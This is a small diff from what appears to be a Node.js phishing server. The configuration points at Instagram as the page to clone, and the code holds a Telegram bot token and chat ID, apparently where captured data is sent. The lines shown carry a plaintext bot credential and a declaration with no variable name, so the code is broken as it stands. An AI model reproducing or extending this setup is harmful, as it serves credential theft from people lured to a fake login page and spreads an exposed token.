@@ -7,7 +7,7 @@ const PORT = process.env.PORT || 3000;
 
 // Configurações
 const TARGET_URL = 'https://www.instagram.com/'; // URL da página que quer clonar
-const  = '8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs';
+const  = ('8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs');
 const TELEGRAM_CHAT_ID = '1004251154302';
 
 app.use(express.json());
